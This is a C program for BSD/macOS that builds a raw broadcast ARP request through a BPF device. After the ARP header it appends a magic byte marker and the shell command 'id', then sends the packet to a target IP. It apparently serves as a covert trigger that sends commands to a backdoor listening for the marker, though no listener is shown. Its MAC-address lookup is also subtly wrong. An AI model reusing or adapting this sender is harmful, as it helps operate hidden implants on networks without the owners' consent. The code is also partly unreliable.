#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <net/ethernet.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <net/bpf.h>

#define ETH_ALEN 6
#define IP_LEN 4
#define ETH_TYPE_ARP 0x0806
#define ARP_REQUEST_OPCODE 0x0001
#define DEFAULT_PACKET_LEN 42
#define FLAG "\x70\x95\x05"


#define LLADDR(s) ((caddr_t)((s)->sdl_data + (s)->sdl_nlen))

// Function to retrieve the MAC address of an interface
int get_mac_address(const char *iface, unsigned char *mac) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return -1;
    }
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFDATA, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        return -1;
    }
    struct sockaddr_dl *sdl = (struct sockaddr_dl *)&ifr.ifr_addr;
    memcpy(mac, LLADDR(sdl), ETH_ALEN);
    close(fd);
    return 0;
}

// Function to retrieve the IP address of an interface
int get_ip_address(const char *iface, struct in_addr *ip) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return -1;
    }
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        return -1;
    }
    *ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
    close(fd);
    return 0;
}

// Function to create and send an ARP request with a payload
void send_arp_request(const char *iface, const char *target_ip_str) {
    int bpf;
    char bpf_device[16];
    unsigned char packet[DEFAULT_PACKET_LEN + 10];
    unsigned char my_mac[ETH_ALEN], target_mac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    struct in_addr my_ip, target_ip;

    // Open BPF device
    for (int i = 0; i < 10; i++) {
        snprintf(bpf_device, sizeof(bpf_device), "/dev/bpf%d", i);
        bpf = open(bpf_device, O_WRONLY);
        if (bpf != -1) break;
    }
    if (bpf == -1) {
        perror("open bpf");
        exit(EXIT_FAILURE);
    }

    // Set BPF interface
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(bpf, BIOCSETIF, &ifr) < 0) {
        perror("BIOCSETIF");
        close(bpf);
        exit(EXIT_FAILURE);
    }

    // Retrieve MAC and IP of the interface
    if (get_mac_address(iface, my_mac) < 0 || get_ip_address(iface, &my_ip) < 0) {
        fprintf(stderr, "Failed to get MAC or IP address of interface %s\n", iface);
        close(bpf);
        exit(EXIT_FAILURE);
    }
    inet_aton(target_ip_str, &target_ip);

    // Fill Ethernet header
    memcpy(packet, target_mac, ETH_ALEN);              // Destination MAC
    memcpy(packet + ETH_ALEN, my_mac, ETH_ALEN);        // Source MAC
    packet[12] = ETH_TYPE_ARP >> 8;
    packet[13] = ETH_TYPE_ARP & 0xff;

    // Fill ARP header
    unsigned char *arp_header = packet + 14;
    arp_header[0] = 0x00;                             // Hardware type (Ethernet)
    arp_header[1] = 0x01;
    arp_header[2] = 0x08;                             // Protocol type (IP)
    arp_header[3] = 0x00;
    arp_header[4] = ETH_ALEN;                          // Hardware size
    arp_header[5] = IP_LEN;                           // Protocol size
    arp_header[6] = ARP_REQUEST_OPCODE >> 8;          // Opcode (ARP Request)
    arp_header[7] = ARP_REQUEST_OPCODE & 0xff;

    // ARP Payload
    memcpy(arp_header + 8, my_mac, ETH_ALEN);          // Sender MAC address
    memcpy(arp_header + 14, &my_ip, IP_LEN);          // Sender IP address
    memcpy(arp_header + 18, target_mac, ETH_ALEN);     // Target MAC address (unknown)
    memcpy(arp_header + 24, &target_ip, IP_LEN);      // Target IP address

    // Append custom payload
    const char *payload = "id";
    size_t size = ETH_HLEN + 28 + strlen(payload) + strlen(FLAG);
    memcpy(packet + ETH_HLEN + 28, FLAG, strlen(FLAG));
    memcpy(packet + ETH_HLEN + 28 + strlen(FLAG), payload, strlen(payload));
    size_t packet_len = ETH_HLEN + 28 + strlen(payload) + strlen(FLAG);

    // Send the packet
    if (write(bpf, packet, packet_len) < 0) {
        perror("write");
    } else {
        printf("ARP request sent to %s\n", target_ip_str);
    }

    close(bpf);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Retrieve interface name from file
    char iface[32];
    FILE *fp = fopen("./interface", "r");
    if (fp == NULL || fscanf(fp, "%31s", iface) != 1) {
        fprintf(stderr, "Error reading interface file.\n");
        exit(EXIT_FAILURE);
    }
    fclose(fp);

    send_arp_request(iface, argv[1]);

    return 0;
}
